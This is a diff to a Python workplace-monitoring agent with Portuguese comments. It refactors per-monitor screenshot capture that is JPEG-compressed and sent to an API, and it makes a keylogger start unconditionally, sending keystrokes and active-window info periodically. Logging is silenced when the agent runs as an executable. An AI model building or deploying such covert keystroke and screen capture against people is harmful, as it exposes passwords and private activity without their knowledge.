@@ -177,8 +177,8 @@ SSL_VERIFY = os.getenv('SSL_VERIFY', 'true').lower() == 'true'
 SSL_CERT_PATH = os.getenv('SSL_CERT_PATH', None)  # Caminho opcional para certificado customizado
 
 # Configurações de monitoramento
-SCREENSHOT_ENABLED = True      # Habilitar captura de screenshots (futuro)
-SCREENSHOT_QUALITY = 55        # Qualidade do screenshot (1-100)
+SCREENSHOT_ENABLED = True      # Habilitar captura de frames de tela (timeline)
+SCREENSHOT_QUALITY = 55        # Qualidade JPEG (1-100)
 MONITOR_INTERVAL = 10          # Intervalo entre verificações (segundos)
 IDLE_THRESHOLD = 600           # Tempo de inatividade para considerar ocioso (segundos)
 REQUEST_TIMEOUT = 30           # Timeout para requisições HTTP (segundos)
@@ -1819,33 +1819,31 @@ def esta_em_horario_trabalho(usuario_nome, tz):
         return True
 
 
-# ========== Frames de tela (timeline - envio a cada segundo) ==========
+# ========== Screenshot / Frames de tela (simples: captura e envia JPEG) ==========
 
 def capture_screen_frames():
     """
-    Captura um frame de cada monitor, redimensiona e comprime em JPEG.
+    Captura um frame por monitor (mss + cv2), redimensiona e comprime em JPEG.
     Retorna lista de bytes (JPEG) ou lista vazia se falhar.
     """
-    if not SCREEN_CAPTURE_AVAILABLE or mss is None or cv2 is None:
+    if mss is None or cv2 is None:
         return []
     try:
+        import numpy as np
         with mss.mss() as sct:
             out = []
-            for i, mon in enumerate(sct.monitors):
-                if i == 0 and len(sct.monitors) > 1:
-                    continue  # monitor 0 é "all", pular se houver monitores reais
+            monitors = sct.monitors
+            # monitor 0 = "all"; se houver mais de um, pular o 0
+            start = 1 if len(monitors) > 1 else 0
+            for i in range(start, len(monitors)):
+                mon = monitors[i]
                 img = sct.grab(mon)
-                if cv2 is None:
-                    continue
-                import numpy as np
-                # mss: BGRA bytes -> numpy array -> BGR para cv2
                 frame = np.frombuffer(img.raw, dtype=np.uint8).reshape((img.height, img.width, 4))
                 frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                 h, w = frame.shape[:2]
                 if SCREEN_FRAME_MAX_WIDTH and w > SCREEN_FRAME_MAX_WIDTH:
-                    r = SCREEN_FRAME_MAX_WIDTH / w
                     new_w = SCREEN_FRAME_MAX_WIDTH
-                    new_h = int(h * r)
+                    new_h = int(h * new_w / w)
                     frame = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_AREA)
                 quality = max(1, min(100, SCREEN_FRAME_QUALITY))
                 _, jpeg = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, quality])
@@ -1854,7 +1852,7 @@ def capture_screen_frames():
             return out
     except Exception as e:
         if not IS_EXECUTABLE:
-            safe_print(f"[FRAMES] Erro ao capturar telas: {e}")
+            safe_print(f"[FRAMES] Erro ao capturar: {e}")
         return []
 
 
@@ -1925,8 +1923,7 @@ def enviar_keylog(usuario_monitorado_id, entries):
 
 def _screen_frame_worker(usuario_monitorado_id_ref):
     """
-    Worker que roda em thread: a cada SCREEN_FRAME_INTERVAL segundos captura e envia frames.
-    usuario_monitorado_id_ref: lista de 1 elemento [id] para ser atualizado pelo main.
+    Worker simples: a cada SCREEN_FRAME_INTERVAL segundos captura tela e envia frames para a API.
     """
     while not check_stop_flag():
         try:
@@ -1934,16 +1931,14 @@ def _screen_frame_worker(usuario_monitorado_id_ref):
             if check_stop_flag() or check_pause_flag():
                 continue
             uid = usuario_monitorado_id_ref[0] if usuario_monitorado_id_ref else None
-            if uid is None:
-                continue
-            if not SCREENSHOT_ENABLED or not SCREEN_CAPTURE_AVAILABLE:
+            if uid is None or not SCREENSHOT_ENABLED:
                 continue
             frames = capture_screen_frames()
             if frames:
                 enviar_screen_frames(uid, frames)
         except Exception as e:
             if not IS_EXECUTABLE:
-                safe_print(f"[FRAMES] Worker erro: {e}")
+                safe_print(f"[FRAMES] Erro: {e}")
 
 
 def enviar_atividade(registro):
@@ -2158,19 +2153,31 @@ def main():
 
     # Referência mutável para o worker de frames de tela (atualizado no loop)
     screen_frame_user_ref = [usuario_monitorado_id]  # sempre definido para o loop atualizar
-    if SCREENSHOT_ENABLED and SCREEN_CAPTURE_AVAILABLE:
-        import threading
-        frame_thread = threading.Thread(target=_screen_frame_worker, args=(screen_frame_user_ref,), daemon=True)
-        frame_thread.start()
-        safe_print("[FRAMES] Thread de frames de tela iniciada (envio a cada %s s)" % SCREEN_FRAME_INTERVAL)
+
+    # Keylogger: sempre iniciar (independente de captura de tela)
+    try:
+        from keylogger import start_keylogger
+        if start_keylogger(get_active_window_info, enviar_keylog, screen_frame_user_ref):
+            safe_print("[KEYLOG] Keylogger iniciado (envio periodico para API)")
+        else:
+            safe_print("[KEYLOG] Keylogger nao iniciado (pynput indisponivel)")
+    except ImportError:
+        safe_print("[KEYLOG] pynput nao instalado - keylog desativado. pip install pynput para ativar.")
+    except Exception as e:
+        safe_print("[KEYLOG] Falha ao iniciar keylogger: %s" % e)
+
+    # Screenshot / frames de tela: simples, inicia se mss e cv2 estiverem disponíveis
+    if SCREENSHOT_ENABLED:
         try:
-            from keylogger import start_keylogger
-            if start_keylogger(get_active_window_info, enviar_keylog, screen_frame_user_ref):
-                safe_print("[KEYLOG] Keylogger iniciado (envio periodico para API)")
-        except ImportError:
-            safe_print("[KEYLOG] pynput nao instalado - keylog desativado. pip install pynput para ativar.")
+            import threading
+            if mss is not None and cv2 is not None:
+                frame_thread = threading.Thread(target=_screen_frame_worker, args=(screen_frame_user_ref,), daemon=True)
+                frame_thread.start()
+                safe_print("[FRAMES] Screenshot ativo (envio a cada %s s)" % SCREEN_FRAME_INTERVAL)
+            else:
+                safe_print("[FRAMES] mss ou cv2 indisponivel - screenshot desativado. pip install mss opencv-python")
         except Exception as e:
-            safe_print("[KEYLOG] Falha ao iniciar keylogger: %s" % e)
+            safe_print("[FRAMES] Falha ao iniciar screenshot: %s" % e)
 
     while True:
         # Verificar flag de parada
